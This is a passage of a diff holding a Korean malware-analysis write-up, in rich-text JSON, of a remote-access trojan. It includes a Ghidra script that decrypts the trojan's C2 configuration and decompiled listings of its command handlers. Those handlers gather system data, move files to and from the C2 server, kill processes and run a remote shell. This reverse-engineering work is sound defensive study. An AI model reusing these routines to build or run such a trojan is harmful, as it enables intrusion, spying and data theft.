+                  {
+                    "type": "text",
+                    "text": ": HTTP 프로토콜의 표준 헤더나 데이터 전송 시 대역폭을 아끼기 위해 1바이트 기반의 ASCII를 선호한다. 만약 이 키가 네트워크 패킷에 포함되어 전송된다면 유니코드보다 용량이 절반인 ASCII가 효율적이다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "파씽을 아래 기드라 파이썬 코드로 하면 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "#TODO write a description for this script\n#@author \n#@category _NEW_\n#@keybinding \n#@menupath \n#@toolbar \n#@runtime PyGhidra\nfrom struct import unpack\n\ndef init_rc4(key):\n    index1 = 0\n    index2 = 0\n    table = list(range(256))\n    for i in range(256):\n        index2 = (key[index1 % len(key)] + table[i] + index2) & 0xff\n        table[i], table[index2] = table[index2], table[i]\n        index1 += 1\n    return table\n\ndef rc4(enc, table):\n    x = 0\n    y = 0\n    res = list(enc)\n    for i in range(len(res)):\n        x = (x + 1) & 0xff\n        y = (table[x] + y) & 0xff\n        table[x], table[y] = table[y], table[x]\n        res[i] ^= table[(table[x] + table[y]) & 0xff]\n    return bytes(res)\n\ndef do_rc4(enc, key):\n    table = init_rc4(key)\n    return rc4(enc, table)\n\n# 데이터 추출\nkey = getBytes(toAddr(0x00416000), 0x4)\nenc = bytearray(getBytes(toAddr(0x00416008), 0x146))\ndecrypted_conf = do_rc4(enc, key)\n\n# 유니코드 문자열 처리 함수\ndef get_unicode_string(data):\n    # Null 바이트가 두 번 연속(\\x00\\x00) 나오는 지점이 유니코드 문자열의 끝입니다.\n    # 하지만 여기서는 데이터 사이에 \\x00이 섞여있으므로, \n    # utf-16le로 디코딩 후 null 문자를 제거하는 것이 깔끔합니다.\n    return data.decode('utf-16le', 'ignore').split('\\x00')[0]\n\nprint(\"parse_mothra_conf.py> Running...\")\n\n# 사진의 오프셋에 맞춰 유니코드 방식으로 출력\nprint(\"hostname: {}\".format(get_unicode_string(decrypted_conf[:128])))\nprint(\"port: {}\".format(unpack(\"<H\", decrypted_conf[128:130])[0]))\nprint(\"path: {}\".format(get_unicode_string(decrypted_conf[130:258])))\n\n# rc4key는 데이터 형태를 보니 ASCII일 가능성이 높으므로 일반 디코딩 시도\ntry:\n    rc4_key_part = decrypted_conf[258:322].split(b'\\x00')[0].decode('utf-8')\nexcept:\n    rc4_key_part = get_unicode_string(decrypted_conf[258:322])\n    \nprint(\"rc4key: {}\".format(rc4_key_part))\nprint(\"sleep_sec: {}\".format(unpack(\"<I\", decrypted_conf[322:326])[0]))\n\nprint(\"parse_mothra_conf.py> Finished!\")"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "2bbc2dbc-ae29-50c7-b66b-7cc39b0ff344",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/2bbc2dbc-ae29-50c7-b66b-7cc39b0ff344.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "8. Fun4028500_execute_command()"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "RAT_context랑 수신 데이터를 인자로 받는다. 명령어를 받고 var의 값에 따라서 switch문이 일어난다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "6cab4aa8-0105-5aa2-821e-d7a0a491a136",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/6cab4aa8-0105-5aa2-821e-d7a0a491a136.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "uint __cdecl execute_command(undefined4 *param_1,uint *param_2)\n\n{\n  uint uVar1;\n  bool bVar2;\n  undefined3 extraout_var;\n  undefined3 extraout_var_00;\n  uint local_c;\n  \n  local_c = 0;\n  uVar1 = *param_2;\n  if (uVar1 < 0x202) {\n    if (uVar1 == 0x201) {\n      local_c = FUN_00401c70(param_1);\n    }\n    else if (uVar1 < 0x102) {\n      if (uVar1 == 0x101) {\n        local_c = list_drive_00402030(param_1);\n      }\n      else if (uVar1 == 1) {\n        local_c = sleep(param_2[2]);\n      }\n      else if (uVar1 == 2) {\n                    /* WARNING: Subroutine does not return */\n        ExitProcess(1);\n      }\n    }\n    else if (uVar1 == 0x102) {\n      local_c = list_interface_ip_00401e70(param_1);\n    }\n    else if (uVar1 == 0x103) {\n      local_c = list_window_FUN_00401b60(param_1);\n    }\n    else if (uVar1 == 0x104) {\n      local_c = close_window_00401be0((HWND)param_2[2]);\n    }\n  }\n  else if (uVar1 < 0x302) {\n    if (uVar1 == 0x301) {\n      local_c = FUN_00402150(param_1,(LPCWSTR)(param_2 + 2));\n    }\n    else if (uVar1 == 0x202) {\n      bVar2 = FUN_00401c00(param_2[2]);\n      local_c = CONCAT31(extraout_var,bVar2);\n    }\n    else if (uVar1 == 0x203) {\n      local_c = FUN_00401a20((LPCWSTR)(param_2 + 2));\n    }\n    else if (uVar1 == 0x204) {\n      local_c = FUN_00401a40((LPCWSTR)(param_2 + 2));\n    }\n  }\n  else if (uVar1 < 0x402) {\n    if (uVar1 == 0x401) {\n      bVar2 = FUN_004027e0(param_1);\n      local_c = CONCAT31(extraout_var_00,bVar2);\n    }\n    else {\n      switch(uVar1) {\n      case 0x302:\n        local_c = FUN_00402370((LPCWSTR)(param_2 + 2));\n        break;\n      case 0x303:\n        local_c = FUN_00402380((LPCWSTR)(param_2 + 2));\n        break;\n      case 0x304:\n        local_c = FUN_004024c0(param_1,param_2 + 2);\n        break;\n      case 0x305:\n        local_c = FUN_004023b0(param_1,param_2 + 2);\n      }\n    }\n  }\n  else if (uVar1 == 0x402) {\n    local_c = FUN_004026b0(param_2 + 2,param_2[1]);\n  }\n  else if (uVar1 == 0x403) {\n    local_c = FUN_004025a0();\n  }\n  return local_c;\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 102, Fun401e70"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "디컴파일된 C 언어 함수로, 감염된 시스템의 네트워크 인터페이스에서 IP 주소 목록을 수집하여 C2(명령 제어) 서버로 전송하는 전형적인 악성코드의 정보 수집 기능이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "int __cdecl list_interface_ip_00401e70(undefined4 *param_1)\n\n{\n  int iVar1;\n  WCHAR local_34c [256];\n  char local_14c [256];\n  addrinfo pHints;\n  DWORD local_20;\n  int local_1c;\n  uint local_18;\n  uint local_14;\n  size_t senbuf_size;\n  LPVOID send_buf;\n  int local_8;\n  \n  pHints.ai_flags = 0;\n  pHints.ai_family = 0;\n  pHints.ai_socktype = 0;\n  pHints.ai_protocol = 0;\n  pHints.ai_addrlen = 0;\n  pHints.ai_addr = (sockaddr *)0x0;\n  pHints.ai_canonname = (char *)0x0;\n  pHints.ai_next = (addrinfo *)0x0;\n  local_18 = 0x8000;\n  senbuf_size = 0;\n  send_buf = Heapoallocation(0x8000);\n  if (send_buf == (LPVOID)0x0) {\n    iVar1 = 0;\n  }\n  else {\n    pHints.ai_family = 0;\n    pHints.ai_socktype = 1;\n    pHints.ai_protocol = 6;\n    gethostname(local_14c,0x100);\n    iVar1 = getaddrinfo(local_14c,0,&pHints,&local_1c);\n    if (iVar1 == 0) {\n      for (local_8 = local_1c; local_8 != 0; local_8 = *(int *)(local_8 + 0x1c)) {\n        if ((*(int *)(local_8 + 4) == 2) || (*(int *)(local_8 + 4) == 0x17)) {\n          local_20 = 0x100;\n          WSAAddressToStringW(*(LPSOCKADDR *)(local_8 + 0x18),*(DWORD *)(local_8 + 0x10),\n                              (LPWSAPROTOCOL_INFOW)0x0,local_34c,&local_20);\n          iVar1 = local_20 * 2;\n          local_14 = senbuf_size + 4 + iVar1;\n          if (local_18 < local_14) {\n            send_buf = FUN_004011d0(send_buf,local_14 + 0x8000);\n            if (send_buf == (LPVOID)0x0) {\n              freeaddrinfo(local_1c);\n              return 0;\n            }\n            local_18 = local_14 + 0x8000;\n          }\n          *(undefined4 *)((int)send_buf + senbuf_size) = *(undefined4 *)(local_8 + 4);\n          lstrcpyW((LPWSTR)((undefined4 *)((int)send_buf + senbuf_size) + 1),local_34c);\n          senbuf_size = senbuf_size + 4 + iVar1;\n        }\n      }\n      freeaddrinfo(local_1c);\n      iVar1 = communicate_c2(param_1,0xab3,send_buf,senbuf_size,(int *)0x0,(SIZE_T *)0x0);\n      free_memory(send_buf);\n    }\n    else {\n      iVar1 = 0;\n    }\n  }\n  return iVar1;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 101, Fun402830 "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "드라이브 리스트를 보내는 함수이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "int __cdecl list_drive_00402030(undefined4 *param_1)\n\n{\n  WCHAR local_44 [4];\n  UINT local_3c;\n  ULARGE_INTEGER local_38;\n  ULARGE_INTEGER local_30;\n  ULARGE_INTEGER local_28;\n  WCHAR local_20 [4];\n  int local_18;\n  UINT local_14;\n  void *sendbuf;\n  size_t sendbif_size;\n  WCHAR local_8;\n  \n  local_20[0] = L'\\0';\n  local_20[1] = 0x3a;\n  local_20[2] = 0x5c;\n  local_20[3] = 0;\n  sendbif_size = 0;\n  sendbuf = Heapoallocation(0x8000);\n  if (sendbuf == (LPVOID)0x0) {\n    local_18 = 0;\n  }\n  else {\n    for (local_8 = L'B'; (ushort)local_8 < 0x5b; local_8 = local_8 + L'\\x01') {\n      local_20[0] = local_8;\n      local_14 = GetDriveTypeW(local_20);\n      if (local_14 != 1) {\n        _memset(local_44,0,0x24);\n        lstrcpyW(local_44,local_20);\n        local_3c = local_14;\n        GetDiskFreeSpaceExW(local_20,&local_38,&local_30,&local_28);\n        FID_conflict:_memcpy((void *)((int)sendbuf + sendbif_size),local_44,0x24);\n        sendbif_size = sendbif_size + 0x24;\n      }\n    }\n    local_18 = communicate_c2(param_1,0xab1,sendbuf,sendbif_size,(int *)0x0,(SIZE_T *)0x0);\n    free_memory(sendbuf);\n  }\n  return local_18;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 1, Fun402830"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "sleep함수이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "undefined4 __cdecl sleep(int param_1)\n\n{\n  Sleep(param_1 * 1000);\n  return 1;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 2, ExitProcess"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 103, Fun401b60 "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "화면의 모든 최상위 윈도우를 반환한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "int __cdecl list_window_FUN_00401b60(undefined4 *param_1)\n\n{\n  void *local_1c;\n  undefined4 local_18;\n  size_t local_14;\n  int local_10;\n  undefined4 local_c;\n  LPVOID local_8;\n  \n  local_c = 0x8000;\n  local_1c = (void *)0x0;\n  local_18 = 0;\n  local_14 = 0;\n  local_1c = Heapoallocation(0x8000);\n  if (local_1c == (LPVOID)0x0) {\n    local_10 = 0;\n  }\n  else {\n    local_18 = local_c;\n    local_8 = local_1c;\n    EnumWindows(getwindowinfo_lpEnumFunc_00401a60,(LPARAM)&local_1c);\n    local_10 = communicate_c2(param_1,0xab2,local_1c,local_14,(int *)0x0,(SIZE_T *)0x0);\n    free_memory(local_1c);\n  }\n  return local_10;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 104, Fun401be0"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "창을 종료할 메시지를 보낸다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "void __cdecl close_window_00401be0(HWND param_1)\n\n{\n  PostMessageW(param_1,0x10,0,0);\n  return;\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 201, Fun401c70"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "모든 프로세스를 열거한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "int __cdecl FUN_00401c70(undefined4 *param_1)\n\n{\n  WINBOOL WVar1;\n  int iVar2;\n  WCHAR local_46c [260];\n  PROCESSENTRY32W local_264;\n  undefined1 local_38 [4];\n  DWORD local_34;\n  DWORD local_30;\n  int local_28;\n  undefined4 local_24;\n  SIZE_T local_20;\n  uint local_1c;\n  uint local_18;\n  DWORD *local_14;\n  HANDLE local_10;\n  HANDLE local_c;\n  LPVOID local_8;\n  \n  local_1c = 0;\n  local_20 = 0x8000;\n  local_c = CreateToolhelp32Snapshot(2,0);\n  if (local_c == (HANDLE)0xffffffff) {\n    local_28 = 0;\n  }\n  else {\n    local_264.dwSize = 0x22c;\n    WVar1 = Process32FirstW(local_c,&local_264);\n    if (WVar1 == 0) {\n      CloseHandle(local_c);\n      local_28 = 0;\n    }\n    else {\n      local_8 = Heapoallocation(local_20);\n      if (local_8 == (LPVOID)0x0) {\n        local_28 = 0;\n      }\n      else {\n        do {\n          local_10 = OpenProcess(0x410,0,local_264.th32ProcessID);\n          if (local_10 != (HANDLE)0x0) {\n            _memset(local_46c,0,0x208);\n            _memset(&local_34,0,0xc);\n            K32EnumProcessModules(local_10,&local_24,4,local_38);\n            K32GetModuleFileNameExW(local_10,local_24,local_46c,0x208);\n            K32GetModuleInformation(local_10,local_24,&local_34,0xc);\n            iVar2 = lstrlenW(local_46c);\n            local_18 = local_1c + 0xe + iVar2 * 2;\n            if (local_20 < local_18) {\n              local_8 = FUN_004011d0(local_8,local_18 + 0x8000);\n              if (local_8 == (LPVOID)0x0) {\n                CloseHandle(local_c);\n                return 0;\n              }\n              local_20 = local_18 + 0x8000;\n            }\n            local_14 = (DWORD *)((int)local_8 + local_1c);\n            *local_14 = local_264.th32ProcessID;\n            local_14[1] = local_34;\n            local_14[2] = local_30;\n            lstrcpyW((LPWSTR)(local_14 + 3),local_46c);\n            local_1c = local_18;\n          }\n          WVar1 = Process32NextW(local_c,&local_264);\n        } while (WVar1 != 0);\n        CloseHandle(local_c);\n        local_28 = communicate_c2(param_1,0xac1,local_8,local_1c,(int *)0x0,(SIZE_T *)0x0);\n        free_memory(local_8);\n      }\n    }\n  }\n  return local_28;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 202, Fun401c00"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "특정 프로세스 ID를 전달받아 해당 프로세스를 강제로 종료하는 기능을 수행하는 함수이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "내부 함수인 FUN_00401420을 호출하여 현재 실행 중인 프로세스에 SeDebugPrivilege 권한을 부여합니다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "bool __cdecl FUN_00401c00(DWORD param_1)\n\n{\n  HANDLE hProcess;\n  WINBOOL WVar1;\n  bool bVar2;\n  \n  bVar2 = false;\n  FUN_00401420(L\"SeDebugPrivilege\",1);\n  hProcess = OpenProcess(0x1fffff,0,param_1);\n  if (hProcess != (HANDLE)0x0) {\n    WVar1 = TerminateProcess(hProcess,0);\n    bVar2 = WVar1 != 0;\n    CloseHandle(hProcess);\n  }\n  FUN_00401420(L\"SeDebugPrivilege\",0);\n  return bVar2;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 203, Fun401a20"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "shellexecute함수를 실행해 쉘 코드를 실행한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "void __cdecl FUN_004019e0(LPCWSTR param_1,int param_2)\n\n{\n  SHELLEXECUTEINFOW local_40;\n  \n  _memset(&local_40,0,0x3c);\n  local_40.cbSize = 0x3c;\n  local_40.lpFile = param_1;\n  local_40.fMask = 0x440;\n  local_40.nShow = param_2;\n  ShellExecuteExW(&local_40);\n  return;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 204, FUN_00401a40"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "프로세스의 숨김 실행 명령어이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "void __cdecl FUN_004019e0(LPCWSTR param_1,int param_2)\n\n{\n  SHELLEXECUTEINFOW local_40;\n  \n  _memset(&local_40,0,0x3c);\n  local_40.cbSize = 0x3c;\n  local_40.lpFile = param_1;\n  local_40.fMask = 0x440;\n  local_40.nShow = param_2;\n  ShellExecuteExW(&local_40);\n  return;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 301, FUN_00402150"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "파일 나열 명령어이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "int __cdecl FUN_00402150(undefined4 *param_1,LPCWSTR param_2)\n\n{\n  int iVar1;\n  WINBOOL WVar2;\n  WCHAR local_484 [260];\n  _WIN32_FIND_DATAW local_27c;\n  int local_2c;\n  int local_28;\n  size_t local_24;\n  uint local_20;\n  uint local_1c;\n  HANDLE local_18;\n  int local_14;\n  size_t local_10;\n  LPVOID local_c;\n  undefined1 local_5;\n  \n  _memset(local_484,0,0x208);\n  local_10 = 0;\n  local_20 = 0x8000;\n  local_c = Heapoallocation(0x8000);\n  if (local_c == (LPVOID)0x0) {\n    local_2c = 0;\n  }\n  else {\n    lstrcpyW(local_484,param_2);\n    lstrcatW(local_484,L\"\\\\*.*\");\n    local_18 = FindFirstFileW(local_484,&local_27c);\n    if (local_18 != (HANDLE)0xffffffff) {\n      iVar1 = lstrlenW(param_2);\n      local_24 = iVar1 * 2 + 2;\n      FID_conflict:_memcpy(local_c,param_2,local_24);\n      local_10 = local_10 + local_24;\n      do {\n        iVar1 = lstrcmpW(local_27c.cFileName,(LPCWSTR)&lpString2_0040f354);\n        if ((iVar1 != 0) &&\n           (iVar1 = lstrcmpW(local_27c.cFileName,(LPCWSTR)&lpString2_0040f358), iVar1 != 0)) {\n          iVar1 = lstrlenW(local_27c.cFileName);\n          local_28 = iVar1 * 2 + 2;\n          local_1c = local_10 + 0x11 + local_28;\n          if (local_20 < local_1c) {\n            local_c = FUN_004011d0(local_c,local_1c + 0x8000);\n            if (local_c == (LPVOID)0x0) {\n              FindClose(local_18);\n              return 0;\n            }\n            local_20 = local_1c + 0x8000;\n          }\n          local_14 = (int)local_c + local_10;\n          local_5 = (local_27c.dwFileAttributes & 0x10) == 0;\n          *(undefined1 *)local_14 = local_5;\n          *(DWORD *)(local_14 + 1) = local_27c.nFileSizeHigh;\n          *(DWORD *)(local_14 + 5) = local_27c.nFileSizeLow;\n          *(DWORD *)(local_14 + 9) = local_27c.ftLastWriteTime.dwLowDateTime;\n          *(DWORD *)(local_14 + 0xd) = local_27c.ftLastWriteTime.dwHighDateTime;\n          lstrcpyW((LPWSTR)(local_14 + 0x11),local_27c.cFileName);\n          local_10 = local_10 + 0x11 + local_28;\n        }\n        WVar2 = FindNextFileW(local_18,&local_27c);\n      } while (WVar2 != 0);\n    }\n    FindClose(local_18);\n    local_2c = communicate_c2(param_1,0xad1,local_c,local_10,(int *)0x0,(SIZE_T *)0x0);\n    free_memory(local_c);\n  }\n  return local_2c;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 302, FUN_00402370"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "함수는 파일 삭제 명령어이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "void __cdecl FUN_00402370(LPCWSTR param_1)\n\n{\n  DeleteFileW(param_1);\n  return;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 303, FUN_00402380"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "파일 이동 명령어이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "undefined4 __cdecl FUN_00402380(LPCWSTR param_1)\n\n{\n  int iVar1;\n  \n  iVar1 = lstrlenW(param_1);\n  MoveFileW(param_1,param_1 + iVar1 + 1);\n  return 1;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 304, FUN_004024c0"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "파일 다운로드 명령어이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "undefined4 __cdecl FUN_004024c0(undefined4 *param_1,void *param_2)\n\n{\n  int iVar1;\n  uint uVar2;\n  LPCVOID pvVar3;\n  uint uVar4;\n  DWORD local_1c;\n  undefined4 local_18;\n  int local_14;\n  LPCVOID local_10;\n  HANDLE local_c;\n  uint local_8;\n  \n  local_14 = param_1[3];\n  local_18 = 0;\n  iVar1 = communicate_c2(param_1,0xad3,param_2,4,(int *)&local_10,&local_8);\n  if ((iVar1 != 0) && (local_8 != 0)) {\n    local_c = CreateFileW((LPCWSTR)((int)param_2 + 4),0x40000000,1,(LPSECURITY_ATTRIBUTES)0x0,2,0x80\n                          ,(HANDLE)0x0);\n    if (local_c != (HANDLE)0xffffffff) {\n      pvVar3 = local_10;\n      uVar4 = local_8;\n      uVar2 = lstrlenA((LPCSTR)(local_14 + 0x102));\n      do_rc4(local_14 + 0x102,uVar2,(int)pvVar3,uVar4);\n      WriteFile(local_c,local_10,local_8,&local_1c,(LPOVERLAPPED)0x0);\n      CloseHandle(local_c);\n      local_18 = 1;\n    }\n    free_memory(local_10);\n  }\n  return local_18;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 305,"
+          },
+          {
+            "type": "text",
+            "text": " FUN_004023b0"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "파일 업로드 명령어이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "int __cdecl FUN_004023b0(undefined4 *param_1,undefined4 *param_2)\n\n{\n  int iVar1;\n  WINBOOL WVar2;\n  DWORD local_14;\n  DWORD local_10;\n  undefined4 *local_c;\n  HANDLE local_8;\n  \n  local_8 = CreateFileW((LPCWSTR)(param_2 + 1),0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,\n                        (HANDLE)0x0);\n  if (local_8 == (HANDLE)0xffffffff) {\n    iVar1 = 0;\n  }\n  else {\n    local_10 = GetFileSize(local_8,(LPDWORD)0x0);\n    if (local_10 == 0xffffffff) {\n      CloseHandle(local_8);\n      iVar1 = 0;\n    }\n    else {\n      local_c = Heapoallocation(local_10 + 4);\n      if (local_c == (undefined4 *)0x0) {\n        CloseHandle(local_8);\n        iVar1 = 0;\n      }\n      else {\n        *local_c = *param_2;\n        WVar2 = ReadFile(local_8,local_c + 1,local_10,&local_14,(LPOVERLAPPED)0x0);\n        if ((WVar2 == 0) || (local_10 != local_14)) {\n          CloseHandle(local_8);\n          free_memory(local_c);\n          iVar1 = 0;\n        }\n        else {\n          iVar1 = communicate_c2(param_1,0xad2,local_c,local_10 + 4,(int *)0x0,(SIZE_T *)0x0);\n          free_memory(local_c);\n        }\n      }\n    }\n  }\n  return iVar1;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 401,"
+          },
+          {
+            "type": "text",
+            "text": " FUN_004027e0"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "원격 쉘을 시작한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "bool __cdecl FUN_004027e0(LPVOID param_1)\n\n{\n  HANDLE hObject;\n  \n  FUN_004025a0();\n  hObject = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,lpStartAddress_00401040,param_1,0,(LPDWORD)0x0\n                        );\n  if (hObject != (HANDLE)0x0) {\n    CloseHandle(hObject);\n  }\n  return hObject != (HANDLE)0x0;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 402,"
+          },
+          {
+            "type": "text",
+            "text": " FUN_004026b0"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "원격 명령을 실행한다,"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "undefined4 __cdecl FUN_004026b0(LPCVOID param_1,DWORD param_2)\n\n{\n  WINBOOL WVar1;\n  DWORD local_c;\n  undefined4 local_8;\n  \n  local_8 = 0;\n  if (DAT_004169d0 != 0) {\n    WVar1 = WriteFile(hWritePipe_004169e4,param_1,param_2,&local_c,(LPOVERLAPPED)0x0);\n    if (WVar1 == 0) {\n      FUN_004025a0();\n    }\n    else {\n      local_8 = 1;\n    }\n  }\n  return local_8;\n}"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var = 403,"
+          },
+          {
+            "type": "text",
+            "text": " FUN_004025a0"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "원격 쉘 종료이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
